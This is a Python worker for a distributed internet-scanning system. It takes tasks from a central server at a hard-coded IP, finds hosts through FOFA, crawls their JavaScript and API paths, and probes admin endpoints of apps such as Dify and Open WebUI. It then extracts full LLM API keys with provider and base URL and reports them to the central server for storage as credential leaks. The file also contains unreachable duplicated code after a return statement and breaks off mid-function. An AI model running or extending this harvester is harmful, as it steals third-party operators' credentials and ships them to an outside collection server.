"""
执行引擎 Worker - 运行在执行节点（公网服务器）上

职责：
1. 定期向大脑（121.41.98.7）上报心跳，宣告自身可用
2. 从大脑拉取任务
3. 执行任务（fofa 资产发现 / 漏洞检测 / API 扫描 / 技术检测）
4. 将结果通过 lab report 回传大脑，由大脑统一存储

依赖：requests、python-dotenv（与主应用相同）
运行方式：python worker.py
"""
import json
import logging
import os
import signal
import sys
import threading
import time
import uuid
from typing import Any, Dict, List, Optional

import requests
from dotenv import load_dotenv

# 优先加载 worker 专属配置，再加载默认 .env（如果存在）
load_dotenv(".env.worker", override=True)
load_dotenv(".env", override=False)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
)
logger = logging.getLogger("WorkerNode")

# ============================================================
# 配置（环境变量）
# ============================================================
BRAIN_URL = os.environ.get("BRAIN_URL", "http://121.41.98.7:5566").rstrip("/")
NODE_ID = os.environ.get("NODE_ID", "")
NODE_NAME = os.environ.get("NODE_NAME", NODE_ID)
NODE_TOKEN = os.environ.get("NODE_TOKEN", "")
HEARTBEAT_INTERVAL = max(30, int(os.environ.get("HEARTBEAT_INTERVAL", "60")))
TASK_POLL_INTERVAL = max(10, int(os.environ.get("TASK_POLL_INTERVAL", "30")))
CAPABILITIES = [c.strip() for c in os.environ.get(
    "NODE_CAPABILITIES", "fofa,vuln,api,tech").split(",") if c.strip()]

# 执行任务时使用的 FoFa 凭据（执行节点自身的，或由大脑下发）
FOFA_KEY = os.environ.get("FOFA_KEY", "")
FOFA_SIZE = int(os.environ.get("FOFA_SIZE", "100"))
SCAN_TIMEOUT = int(os.environ.get("SCAN_TIMEOUT", "10"))


def _headers() -> Dict[str, str]:
    return {
        "Authorization": f"Bearer {NODE_TOKEN}",
        "X-Lab-Token": NODE_TOKEN,
        "Content-Type": "application/json",
        "X-Node-Id": NODE_ID,
    }


def _require_node_id():
    if not NODE_ID:
        logger.error("必须配置 NODE_ID 环境变量")
        sys.exit(1)


# ============================================================
# 任务执行器
# ============================================================
def execute_task(task: Dict[str, Any]) -> Dict[str, Any]:
    """执行一个任务，返回实验结果字典（与大数据库实验结构兼容）。"""
    task_id = task.get("task_id", uuid.uuid4().hex)
    task_type = task.get("type", "scan")
    params = task.get("params", {})

    logger.info("执行任务 %s (type=%s)", task_id, task_type)
    result = {
        "experiment_id": task_id,
        "project_slug": params.get("project_slug", "manual"),
        "project_name": params.get("project_name", params.get("project_slug", "manual")),
        "version": params.get("version", "待确认"),
        "status": "completed",
        "hypothesis": params.get("hypothesis", f"任务 {task_id}"),
        "public_observation": "",
        "reproduction_summary": "",
        "evidence": [],
        "remediation": "",
        "conclusion_boundary": "靶场复现不等同于第三方公网实例已被利用。",
    }

    try:
        if task_type == "fofa_discovery":
            result = _run_fofa_discovery(task_id, params, result)
        elif task_type == "vuln_check":
            result = _run_vuln_check(task_id, params, result)
        elif task_type == "api_scan":
            result = _run_api_scan(task_id, params, result)
        elif task_type == "tech_detect":
            result = _run_tech_detect(task_id, params, result)
        elif task_type == "deep_analysis":
            result = _run_deep_analysis(task_id, params, result)
        elif task_type == "api_crawl":
            result = _run_api_crawl(task_id, params, result)
        elif task_type == "echo":
            # 连通性测试任务
            result["reproduction_summary"] = f"echo ok: {params.get('message', 'ping')}"
            result["evidence"] = [{"type": "echo", "value": params.get("message", "ping")}]
        else:
            result["status"] = "error"
            result["reproduction_summary"] = f"不支持的任务类型: {task_type}"
    except Exception as exc:
        logger.exception("任务 %s 执行失败", task_id)
        result["status"] = "error"
        result["reproduction_summary"] = str(exc)
    return result


SECRET_PATTERNS = [
    (r"sk-[a-zA-Z0-9]{20,}", "OpenAI/DeepSeek API Key (sk-)"),
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
    (r"ghp_[a-zA-Z0-9]{36}", "GitHub Token"),
    (r"eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}", "JWT Token"),
    (r"AKLT[a-zA-Z0-9_-]{20,}", "Google API Key"),
    (r"AIza[0-9A-Za-z_-]{35}", "Google API Key (AIza)"),
    (r"xox[baprs]-[a-zA-Z0-9-]{20,}", "Slack Token"),
    (r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY", "私钥 Private Key"),
    (r"(?i)(api[_-]?key|apikey|secret[_-]?key|access[_-]?key)\s*[:=]\s*[\"'][a-zA-Z0-9_\-]{16,}[\"']", "硬编码密钥"),
]


KNOWN_APP_PANELS = {
    "deeptutor": [
        "/settings/llm", "/settings/models", "/settings/agents",
        "/api/v1/settings/llm", "/api/v1/settings/llm-options",
        "/api/v1/settings", "/api/v1/settings/models",
        "/api/v1/users/me", "/api/v1/config",
    ],
    "open-webui": [
        "/api/v1/auths", "/api/v1/users/", "/api/v1/models",
        "/api/v1/tools/", "/api/v1/knowledge/",
    ],
    "dify": [
        "/console/api/setup", "/console/api/workspaces/current",
        "/console/api/workspaces/current/members", "/api/setup",
    ],
    "firecrawl": [
        "/api/v1/team", "/api/v1/user", "/api/v1/keys",
        "/api/v1/config", "/api/v1/crawl/status/test",
    ],
    "anythingllm": [
        "/api/system", "/api/users", "/api/settings",
        "/api/workspaces", "/api/embedders",
    ],
    "lobechat": [
        "/api/auth/session", "/api/user/settings",
        "/api/chat/models", "/api/plugin/list",
    ],
    "1panel": [
        "/api/v1/auth/status", "/api/v1/dashboard/base/os",
        "/api/v1/settings", "/api/v1/users",
    ],
}


def _scan_known_app_panels(base_url: str) -> list:
    """针对已知热门应用枚举常见管理/设置 API 路径，扫描响应中的敏感信息泄露。

    返回值: [{"app": "deeptutor", "path": "...", "status": 200, "secret_type": "OpenAI Key",
                "value_masked": "sk-xxxxxxxx", "matched": "sk-..."}]
    """
    import re
    from urllib.parse import urlparse
    parsed = urlparse(base_url)
    host = f"{parsed.scheme}://{parsed.netloc}"
    hits = []

    # 识别当前应用（从首页 / 路径特征）
    try:
        home = requests.get(base_url, timeout=SCAN_TIMEOUT,
                            headers={"User-Agent": "Mozilla/5.0"}, verify=False)
        home_text = home.text.lower()
        app_name = None
        for app in KNOWN_APP_PANELS:
            if app in home_text:
                app_name = app
                break
    except Exception:
        app_name = None

    # 同时对每个已知应用试探核心端点（提升命中率）
    target_apps = {app_name} if app_name else set(KNOWN_APP_PANELS.keys())
    for app in list(target_apps):
        for path in KNOWN_APP_PANELS.get(app, []):
            url = host + path
            try:
                resp = requests.get(url, timeout=SCAN_TIMEOUT,
                                    headers={"User-Agent": "Mozilla/5.0",
                                             "Accept": "application/json"},
                                    verify=False)
                if resp.status_code != 200:
                    continue
                body = resp.text
                # token 模式扫描
                for pattern, name in SECRET_PATTERNS:
                    for m in re.finditer(pattern, body):
                        val = m.group(0)
                        if len(val) > 20:
                            shown = val[:8] + "..." + val[-4:]
                        else:
                            shown = val[:4] + "..." + val[-2:]
                        hits.append({
                            "app": app, "path": path, "url": url,
                            "secret_type": name, "value_masked": shown,
                            "matched": pattern[:30],
                        })
            except Exception:
                continue
    return hits


def _scan_js_secrets(base_url: str) -> list:
    """拉取页面引用的 JS 文件并扫描其中的真实密钥值（SK/AK/token 等）。"""
    import re
    hits = []
    try:
        resp = requests.get(base_url, timeout=SCAN_TIMEOUT,
                            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                            verify=False)
        if resp.status_code != 200:
            return hits
        html = resp.text
        # 提取 JS 文件 URL
        js_urls = set(re.findall(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', html))
        js_urls.update(re.findall(r'["\'](/[^"\']*\.js)["\']', html))
        fetched = set()
        for js_url in list(js_urls)[:15]:
            if js_url.startswith("http"):
                full = js_url
            elif js_url.startswith("//"):
                full = "http:" + js_url
            else:
                full = base_url.rstrip("/") + "/" + js_url.lstrip("/")
            if full in fetched:
                continue
            fetched.add(full)
            try:
                js_resp = requests.get(full, timeout=SCAN_TIMEOUT, verify=False,
                                       headers={"User-Agent": "Mozilla/5.0"})
                if js_resp.status_code != 200:
                    continue
                js_body = js_resp.text
                for pattern, name in SECRET_PATTERNS:
                    for m in re.finditer(pattern, js_body):
                        val = m.group(0)
                        # 脱敏显示，只留前后几位
                        if len(val) > 20:
                            shown = val[:8] + "..." + val[-4:]
                        else:
                            shown = val[:4] + "..." + val[-2:]
                        hits.append({
                            "type": "js_secret", "source": full,
                            "secret_type": name, "value_masked": shown, "matched": pattern[:30],
                        })
                        if len(hits) >= 20:
                            return hits
            except Exception:
                continue
    except Exception:
        pass
    return hits


PROVIDER_HINTS = [
    ("openai", ["api.openai.com", "openai", "gpt-4", "gpt-3"]),
    ("deepseek", ["api.deepseek.com", "deepseek", "deepseek-v4"]),
    ("anthropic", ["api.anthropic.com", "anthropic", "claude"]),
    ("google", ["googleapis.com", "ai.google", "gemini", "google"]),
    ("qwen", ["dashscope", "aliyun", "qwen", "通义"]),
    ("zhipu", ["open.bigmodel.cn", "glm", "zhipu", "智谱"]),
    ("moonshot", ["api.moonshot.cn", "moonshot", "kimi"]),
    ("baidu", ["aip.baidubce.com", "baidu", "文心"]),
    ("siliconflow", ["siliconflow", "硅基流动"]),
]


def _extract_llm_credentials(body: str, url: str) -> list:
    """从 API 响应/JS 内容中提取 LLM 凭据三元组（Provider / Base URL / API Key）。

    返回: [{"provider": "deepseek", "base_url": "https://api.deepseek.com",
             "api_key": "sk-xxx", "source_url": url}]
    """
    import re
    results = []
    # 1. 找 API Key（sk- 前缀，OpenAI/DeepSeek 风格）
    for m in re.finditer(r"(?i)sk-[a-z0-9]{20,}", body):
        key = m.group(0)
        # 找 key 附近的 base_url / provider
        ctx_start = max(0, m.start() - 600)
        ctx_end = min(len(body), m.end() + 600)
        ctx = body[ctx_start:ctx_end]

        # 提取 base_url
        base_url = ""
        m_url = re.search(r"https?://[a-z0-9.-]+(?::\d+)?(?:/v\d+)?", ctx)
        if m_url:
            base_url = m_url.group(0)
        # 提取 provider（优先按 base_url 判定，其次上下文）
        provider = "unknown"
        if base_url:
            for prov, hints in PROVIDER_HINTS:
                if any(h in base_url.lower() for h in hints):
                    provider = prov
                    break
        if provider == "unknown":
            for prov, hints in PROVIDER_HINTS:
                if any(h in ctx.lower() for h in hints):
                    provider = prov
                    break
        results.append({"provider": provider, "base_url": base_url,
                        "api_key": key, "source_url": url})
    return results


def _extract_api_paths_from_js(js_body: str, base_url: str) -> list:
    """从 JS 内容中全量提取 API 路径（fetch/axios/url 字符串等）。"""
    import re
    from urllib.parse import urljoin, urlparse
    paths = set()
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # fetch("/api/xxx", ...) 或 axios.get("/api/xxx")
    patterns = [
        r"""['"](/(?:api|v\d|graphql|rest|internal|_next/data)[a-zA-Z0-9_/.\-?=&${}]*?)['"]""",
        r"""fetch\(\s*['"]([^'"]+)['"]""",
        r"""\.get\(\s*['"]([^'"]+)['"]""",
        r"""\.post\(\s*['"]([^'"]+)['"]""",
        r"""baseURL\s*[:=]\s*['"]([^'"]+)['"]""",
    ]
    for pat in patterns:
        for m in re.finditer(pat, js_body):
            raw = m.group(1)
            if not raw or raw.startswith("http"):
                continue
            if raw.startswith("/"):
                paths.add(raw)
            elif raw.startswith(("./", "../")):
                full = urljoin(base_url.rstrip("/") + "/", raw)
                paths.add(urlparse(full).path)
    # 过滤明显非 API 的静态资源
    filtered = []
    for p in sorted(paths):
        if any(p.endswith(ext) for ext in (".js", ".css", ".png", ".jpg", ".svg", ".woff", ".ico")):
            continue
        if len(p) < 3 or len(p) > 200:
            continue
        filtered.append(p)
    return filtered[:200]


def _crawl_all_apis(target: str) -> dict:
    """全量遍历目标站点的 API：
    1. 抓首页 + 全部 JS/chunk
    2. 从 JS 提取所有 API 路径
    3. 请求所有 API 路径
    4. 扫描响应中的 SK/密钥，提取 Provider/Base URL/API Key 三元组
    """
    import re
    from urllib.parse import urljoin, urlparse
    crawled = {"js_files": 0, "api_paths": [], "api_responses": [], "secrets": []}
    try:
        resp = requests.get(target, timeout=SCAN_TIMEOUT,
                            headers={"User-Agent": "Mozilla/5.0"}, verify=False)
        if resp.status_code != 200:
            return crawled
        html = resp.text

        # 收集所有 JS 文件
        js_urls = set()
        for m in re.finditer(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', html):
            js_urls.add(m.group(1))
        for m in re.finditer(r'["\'](/[^"\']*\.js)["\']', html):
            js_urls.add(m.group(1))

        all_js = ""
        for js_url in list(js_urls)[:20]:
            full = js_url if js_url.startswith("http") else urljoin(target, js_url)
            try:
                js_resp = requests.get(full, timeout=SCAN_TIMEOUT, verify=False,
                                       headers={"User-Agent": "Mozilla/5.0"})
                if js_resp.status_code == 200:
                    all_js += js_resp.text
                    crawled["js_files"] += 1
            except Exception:
                continue

        # 提取 API 路径（从 JS + HTML）
        api_paths = _extract_api_paths_from_js(all_js, target)
        # 补充 HTML 中的路径
        for m in re.finditer(r'(?:action|href)=["\'](/[^"\']*)["\']', html):
            p = m.group(1)
            if p.startswith("/api") or "/api/" in p:
                api_paths.append(p)
        # 去重
        api_paths = sorted(set(api_paths))
        crawled["api_paths"] = api_paths[:200]

        # 请求所有 API 路径，扫描 SK
        parsed = urlparse(target)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        for path in crawled["api_paths"]:
            url = origin + (path if path.startswith("/") else "/" + path)
            try:
                api_resp = requests.get(url, timeout=8, verify=False,
                                        headers={"User-Agent": "Mozilla/5.0",
                                                 "Accept": "application/json,text/plain,*/*"})
                if api_resp.status_code != 200:
                    continue
                body = api_resp.text
                if len(body) < 500000:
                    crawled["api_responses"].append({"path": path, "status": api_resp.status_code,
                                                     "size": len(body)})
                # 提取凭据三元组
                creds = _extract_llm_credentials(body, url)
                for c in creds:
                    if c["api_key"] not in [s["api_key"] for s in crawled["secrets"]]:
                        crawled["secrets"].append({
                            **c,
                            "path": path,
                            "key_masked": c["api_key"][:8] + "..." + c["api_key"][-4:],
                        })
            except Exception:
                continue
    except Exception:
        pass
    return crawled
    import re
    hits = []
    try:
        resp = requests.get(base_url, timeout=SCAN_TIMEOUT,
                            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                            verify=False)
        if resp.status_code != 200:
            return hits
        html = resp.text
        # 提取 JS 文件 URL
        js_urls = set(re.findall(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', html))
        js_urls.update(re.findall(r'["\'](/[^"\']*\.js)["\']', html))
        fetched = set()
        for js_url in list(js_urls)[:15]:
            if js_url.startswith("http"):
                full = js_url
            elif js_url.startswith("//"):
                full = "http:" + js_url
            else:
                full = base_url.rstrip("/") + "/" + js_url.lstrip("/")
            if full in fetched:
                continue
            fetched.add(full)
            try:
                js_resp = requests.get(full, timeout=SCAN_TIMEOUT, verify=False,
                                       headers={"User-Agent": "Mozilla/5.0"})
                if js_resp.status_code != 200:
                    continue
                js_body = js_resp.text
                for pattern, name in SECRET_PATTERNS:
                    for m in re.finditer(pattern, js_body):
                        val = m.group(0)
                        # 脱敏显示，只留前后几位
                        if len(val) > 20:
                            shown = val[:8] + "..." + val[-4:]
                        else:
                            shown = val[:4] + "..." + val[-2:]
                        hits.append({
                            "type": "js_secret", "source": full,
                            "secret_type": name, "value_masked": shown, "matched": pattern[:30],
                        })
                        if len(hits) >= 20:
                            return hits
            except Exception:
                continue
    except Exception:
        pass
    return hits


def _run_api_crawl(task_id: str, params: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    """全量 API 站点遍历：抓取所有 JS/API 路径，扫描 SK 密钥，提取 Provider/Base URL/API Key。

    结果存 credential_leaks 专属数据表（大脑端入库）。
    """
    targets = params.get("targets", [])
    if not targets:
        raise ValueError("api_crawl 需要 targets 参数")

    all_crawled = []
    for target in targets:
        crawled = _crawl_all_apis(target)
        all_crawled.append({"target": target, **crawled})

    total_secrets = sum(len(c.get("secrets", [])) for c in all_crawled)
    total_apis = sum(len(c.get("api_paths", [])) for c in all_crawled)
    total_js = sum(c.get("js_files", 0) for c in all_crawled)

    result["status"] = "completed"
    result["public_observation"] = (
        f"API 全量遍历完成：{len(targets)} 目标 | 抓取 {total_js} 个 JS, "
        f"发现 {total_apis} 个 API 端点, 提取 {total_secrets} 个凭据泄露")
    result["evidence"] = all_crawled
    result["reproduction_summary"] = json.dumps(
        [{"target": c["target"], "js": c["js_files"], "apis": len(c["api_paths"]),
          "secrets": len(c["secrets"])} for c in all_crawled], ensure_ascii=False)
    return result


def _run_deep_analysis(task_id: str, params: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    """综合深度分析：技术指纹 + 漏洞 + API 发现 + 敏感信息（SK/密钥）泄露检测

    对一个资产做完整的 Web 安全评估，产出结构化 evidence。
    """
    from core.tech_detector import TechDetector
    from core.vuln_checker import VulnChecker
    from core.api_scanner import APIScanner
    from core.fofa_client import Asset
    from core.exposure_discovery import FrontendExposureDiscovery

    targets = params.get("targets", [])
    if not targets:
        raise ValueError("deep_analysis 需要 targets 参数")

    detector = TechDetector()
    checker = VulnChecker(enable_nvd=bool(params.get("online", True)), timeout=SCAN_TIMEOUT)
    scanner = APIScanner(timeout=SCAN_TIMEOUT)
    exposure = FrontendExposureDiscovery(timeout=SCAN_TIMEOUT)

    evidence = []
    for target in targets:
        item = {"target": target}
        try:
            # 1. 技术指纹
            techs = detector.detect_from_http(target, timeout=SCAN_TIMEOUT)
            item["technologies"] = [t.to_dict() for t in techs]

            # 2. 基于技术的漏洞匹配
            vulns = checker.check(techs)
            vuln_dicts = [v.to_dict() for v in vulns]
            # 漏洞级验证语义（Codex P0-2）：主动 HTTP 探测 + 指纹命中 → condition_matched
            for vd in vuln_dicts:
                if vd.get("verification_status", "suspected") == "suspected":
                    vd["verification_status"] = "condition_matched"
                    vd["verification_method"] = "active_http_probe_fingerprint"
                    vd["verified_at"] = time.time()
            item["vulnerabilities"] = vuln_dicts

            # 3. API 端点发现 + 安全分析（含敏感信息/SK 检测）
            asset = Asset(host=target, ip=target, port=443, protocol="https", url=target)
            endpoints = scanner.scan(asset)
            item["api_endpoints"] = [ep.to_dict() for ep in endpoints]
            report = scanner.generate_report(asset, endpoints)
            item["api_report"] = asdict_safe(report)

            # 4. 前端暴露面 / 敏感字段检测
            try:
                findings = exposure.discover(target)
                item["exposure_findings"] = [f.to_dict() for f in findings]
            except Exception as exc:
                item["exposure_findings"] = [{"error": str(exc)}]

            # 5. 敏感信息汇总（SK / AK / token 等）
            sensitive_hits = []
            for ep in endpoints:
                for issue in getattr(ep, "issues", []) or []:
                    txt = str(issue)
                    if any(k in txt for k in ("凭证", "密钥", "敏感", "Token", "泄露")):
                        sensitive_hits.append({"endpoint": ep.url, "issue": txt})
            for finding in item.get("exposure_findings", []):
                if finding.get("risk_level") in ("high", "medium"):
                    sensitive_hits.append({"type": "exposure", "detail": finding.get("evidence", "")})

            # 6. JS 文件密钥模式扫描（真实密钥值检测，如 sk-xxx / AKIAxxx）
            js_hits = _scan_js_secrets(target)
            if js_hits:
                sensitive_hits.extend(js_hits)

            # 7. 已知应用面板枚举（DeepTutor / Open WebUI / Dify 等公开管理的 API 端点）
            panel_hits = _scan_known_app_panels(target)
            if panel_hits:
                sensitive_hits.extend(panel_hits)
            item["sensitive_hits"] = sensitive_hits[:30]
            item["js_secret_scan"] = js_hits[:10]
            item["panel_secret_scan"] = panel_hits[:10]
        except Exception as exc:
            item["error"] = str(exc)
        evidence.append(item)
    total_sensitive = sum(len(i.get("sensitive_hits", [])) for i in evidence)
    total_vulns = sum(len(i.get("vulnerabilities", [])) for i in evidence)
    total_apis = sum(len(i.get("api_endpoints", [])) for i in evidence)

    result["status"] = "completed"
    result["public_observation"] = (
        f"深度分析完成：{len(targets)} 目标 | 发现 {total_sensitive} 个敏感信息泄露, "
        f"{total_vulns} 个漏洞, {total_apis} 个 API 端点")
    result["reproduction_summary"] = json.dumps(
        [{"target": i["target"], "sensitive": len(i.get("sensitive_hits", [])),
          "vulns": len(i.get("vulnerabilities", [])), "apis": len(i.get("api_endpoints", []))}
         for i in evidence], ensure_ascii=False)
    result["evidence"] = evidence
    return result


def _run_fofa_discovery(task_id: str, params: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    from core.fofa_client import FofaClient
    query = params.get("query", "")
    size = int(params.get("size", FOFA_SIZE))
    key = params.get("fofa_key", FOFA_KEY)
    if not query:
        raise ValueError("fofa_discovery 需要 query 参数")
    if not key:
        raise ValueError("未配置 FoFa 凭据（环境变量 FOFA_KEY 或任务参数 fofa_key）")
    client = FofaClient(key=key, timeout=SCAN_TIMEOUT + 20, max_retries=2)
    try:
        assets = client.search_all(query, max_results=size)
    finally:
        client.close()
    evidence = [a.to_dict() for a in assets]
    result["status"] = "completed"
    result["public_observation"] = f"FoFa 发现 {len(evidence)} 个资产"
    result["reproduction_summary"] = f"query={query}, size={size}, 命中 {len(evidence)}"
    result["evidence"] = evidence
    return result


def _run_vuln_check(task_id: str, params: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    from core.tech_detector import TechDetector
    from core.vuln_checker import VulnChecker
    targets = params.get("targets", [])
    if not targets:
        raise ValueError("vuln_check 需要 targets 参数")
    # 先做技术栈识别，再基于技术栈做漏洞匹配
    detector = TechDetector()
    checker = VulnChecker(enable_nvd=bool(params.get("online")), timeout=SCAN_TIMEOUT)
    evidence = []
    for target in targets:
        try:
            techs = detector.detect_from_http(target, timeout=SCAN_TIMEOUT)
            vulns = checker.check(techs)
            evidence.append({
                "target": target,
                "technologies": [t.to_dict() for t in techs],
                "vulnerabilities": [v.to_dict() for v in vulns],
            })
        except Exception as exc:
            evidence.append({"target": target, "error": str(exc)})
    result["status"] = "completed"
    result["public_observation"] = f"漏洞检测完成，检测 {len(targets)} 个目标"
    result["reproduction_summary"] = json.dumps(evidence, ensure_ascii=False)[:2000]
    result["evidence"] = evidence
    return result


def _run_api_scan(task_id: str, params: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    from core.api_scanner import APIScanner
    from core.fofa_client import Asset
    targets = params.get("targets", [])
    if not targets:
        raise ValueError("api_scan 需要 targets 参数")
    scanner = APIScanner(timeout=SCAN_TIMEOUT)
    evidence = []
    for target in targets:
        try:
            asset = Asset(host=target, ip=target, port=443, protocol="https", url=target)
            endpoints = scanner.scan(asset)
            report = scanner.generate_report(asset, endpoints)
            evidence.append({"target": target, "report": asdict_safe(report)})
        except Exception as exc:
            evidence.append({"target": target, "error": str(exc)})
    result["status"] = "completed"
    result["public_observation"] = f"API 扫描完成，检测 {len(targets)} 个目标"
    result["reproduction_summary"] = json.dumps(evidence, ensure_ascii=False)[:2000]
    result["evidence"] = evidence
    return result


def _run_tech_detect(task_id: str, params: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    from core.tech_detector import TechDetector
    targets = params.get("targets", [])
    if not targets:
        raise ValueError("tech_detect 需要 targets 参数")
    detector = TechDetector()
    evidence = []
    for target in targets:
        try:
            techs = detector.detect_from_http(target, timeout=SCAN_TIMEOUT)
            evidence.append({"target": target, "technologies": [t.to_dict() for t in techs]})
        except Exception as exc:
            evidence.append({"target": target, "error": str(exc)})
    result["status"] = "completed"
    result["public_observation"] = f"技术栈检测完成，检测 {len(targets)} 个目标"
    result["reproduction_summary"] = json.dumps(evidence, ensure_ascii=False)[:2000]
    result["evidence"] = evidence
    return result


def asdict_safe(obj):
    from dataclasses import asdict, is_dataclass
    if is_dataclass(obj):
        return asdict(obj)
    if isinstance(obj, dict):
        return obj
    return {"value": str(obj)}


# ============================================================
# Worker 主循环
# ============================================================
def _collect_system_metrics() -> Dict[str, Any]:
    """采集本机系统资源指标（CPU/内存/磁盘/负载）"""
    metrics: Dict[str, Any] = {"ts": time.time(), "pid": os.getpid()}
    try:
        # CPU / 负载
        with open("/proc/loadavg") as f:
            parts = f.read().split()
            metrics["load1"], metrics["load5"], metrics["load15"] = (
                float(parts[0]), float(parts[1]), float(parts[2]))
    except Exception:
        pass
    try:
        # 内存
        with open("/proc/meminfo") as f:
            mem = {}
            for line in f:
                k, _, v = line.partition(":")
                mem[k.strip()] = int(v.strip().split()[0]) * 1024
            metrics["mem_total"] = mem.get("MemTotal", 0)
            metrics["mem_available"] = mem.get("MemAvailable", 0)
            metrics["mem_used"] = max(0, mem.get("MemTotal", 0) - mem.get("MemAvailable", 0))
    except Exception:
        pass
    try:
        # CPU 使用率（采样）
        def _cpu_sample():
            with open("/proc/stat") as f:
                line = f.readline()
                parts = list(map(int, line.split()[1:]))
            idle = parts[3] + (parts[4] if len(parts) > 4 else 0)
            total = sum(parts)
            return idle, total
        i1, t1 = _cpu_sample()
        time.sleep(0.3)
        i2, t2 = _cpu_sample()
        d_total = t2 - t1
        if d_total > 0:
            metrics["cpu_percent"] = round((1 - (i2 - i1) / d_total) * 100, 1)
    except Exception:
        pass
    try:
        # 磁盘
        import shutil
        du = shutil.disk_usage("/")
        metrics["disk_total"] = du.total
        metrics["disk_free"] = du.free
        metrics["disk_used"] = du.used
    except Exception:
        pass
    try:
        # 系统运行时长
        with open("/proc/uptime") as f:
            metrics["uptime"] = float(f.read().split()[0])
    except Exception:
        pass
    return metrics


class Worker:
    def __init__(self):
        self.stop_event = threading.Event()
        self._http = requests.Session()

    def _post(self, path: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        resp = self._http.post(f"{BRAIN_URL}{path}", json=payload, headers=_headers(), timeout=30)
        resp.raise_for_status()
        return resp.json()

    def heartbeat(self):
        """向大脑上报心跳与能力（含系统资源指标）"""
        payload = {
            "node_id": NODE_ID,
            "name": NODE_NAME,
            "status": "ready",
            "capabilities": CAPABILITIES,
            "metrics": _collect_system_metrics(),
            "experiments": [],
        }
        try:
            r = self._post("/api/lab/report", payload)
            logger.debug("心跳上报完成: %s", r)
        except Exception as exc:
            logger.warning("心跳上报失败: %s", exc)

    def poll_and_execute(self):
        """拉取任务并执行（此处以本机队列演示；生产可用大脑推送或 Redis 队列）"""
        # 当前实现：心跳 + 直接执行"待分发"任务由大脑侧调度。
        # 为了让链路可测，worker 每次轮询从大脑拉一个示例任务（若大脑配置了待办）。
        try:
            # 拉取任务端点（大脑未配置时返回空）
            resp = self._http.get(
                f"{BRAIN_URL}/api/tasks/assign?node_id={NODE_ID}",
                headers=_headers(), timeout=15)
            if resp.status_code == 200:
                task = resp.json().get("task")
                if task:
                    result = execute_task(task)
                    report = {
                        "node_id": NODE_ID,
                        "name": NODE_NAME,
                        "status": "ready",
                        "capabilities": CAPABILITIES,
                        "metrics": {"ts": time.time()},
                        "experiments": [result],
                    }
                    self._post("/api/lab/report", report)
                    logger.info("任务 %s 结果已回传大脑", task.get("task_id"))
        except requests.exceptions.HTTPError:
            pass  # 大脑未提供 assign 端点时静默
        except Exception as exc:
            logger.warning("轮询任务失败: %s", exc)

    def run(self):
        _require_node_id()
        logger.info("Worker %s 启动: 大脑=%s 能力=%s", NODE_ID, BRAIN_URL, CAPABILITIES)
        # Kafka 任务消费者（若 Kafka 可用）：消费大脑投递的 deep_analysis 任务
        try:
            from core.kafka_pipeline import KafkaConsumer
            kafka_bs = os.environ.get("KAFKA_BOOTSTRAP", "121.41.98.7:9092")
            consumer = KafkaConsumer(bootstrap_servers=kafka_bs,
                                     group_id=f"supply-{NODE_ID}")
            consumer.start(self._handle_kafka_task)
        except Exception as exc:
            logger.warning("Kafka 消费端启动失败（继续轮询大脑）: %s", exc)
        while not self.stop_event.is_set():
            self.heartbeat()
            self.poll_and_execute()
            self.stop_event.wait(HEARTBEAT_INTERVAL)

    def _handle_kafka_task(self, task: dict) -> bool:
        """处理 Kafka 拉取的任务。task 为顶层字段格式（来自大脑 kafka_pipeline）。

        转换为 execute_task 需要的 params 结构后执行，回传大脑。
        """
        try:
            kafka_task = {
                "task_id": task.get("task_id", uuid.uuid4().hex),
                "type": task.get("type", "deep_analysis"),
                "params": {
                    "project_slug": task.get("project_slug", "kafka"),
                    "project_name": task.get("project_name", task.get("project_slug", "kafka")),
                    "targets": task.get("targets", []),
                    "online": task.get("online", True),
                    "hypothesis": task.get("hypothesis", f"Kafka 任务 {task.get('task_id','')[:8]}"),
                },
            }
            logger.info("Kafka 消费任务 %s (%d targets)", kafka_task["task_id"],
                        len(kafka_task["params"]["targets"]))
            result = execute_task(kafka_task)
            report = {
                "node_id": NODE_ID,
                "name": NODE_NAME,
                "status": "ready",
                "capabilities": CAPABILITIES,
                "metrics": _collect_system_metrics(),
                "experiments": [result],
            }
            try:
                self._post("/api/lab/report", report)
            except Exception as exc:
                logger.warning("Kafka 任务结果回传失败: %s", exc)
            return result.get("status") != "error"
        except Exception as exc:
            logger.error("Kafka 任务处理异常: %s", exc)
            return False


def main():
    # 任务接收 HTTP 服务（大脑主动推送的通道）
    from threading import Thread
    from flask import Flask, request, jsonify

    app = Flask(__name__)
    worker = Worker()

    @app.route("/api/v1/tasks/run", methods=["POST"])
    def run_task():
        token = request.headers.get("Authorization", "").replace("Bearer ", "")
        if token != NODE_TOKEN:
            return jsonify({"error": "unauthorized"}), 401
        task = request.get_json(silent=True) or {}
        result = execute_task(task)
        report = {
            "node_id": NODE_ID,
            "name": NODE_NAME,
            "status": "ready",
            "capabilities": CAPABILITIES,
            "metrics": _collect_system_metrics(),
            "experiments": [result],
        }
        try:
            worker._post("/api/lab/report", report)
        except Exception as exc:
            logger.warning("结果回传大脑失败: %s", exc)
        return jsonify({"ok": True, "experiment_id": result.get("experiment_id"),
                        "status": result.get("status")}), 200

    @app.route("/health")
    def health():
        return jsonify({"node_id": NODE_ID, "status": "ready"})

    def _run_http():
        try:
            app.run(host="0.0.0.0", port=5566, threaded=True)
        except Exception as exc:
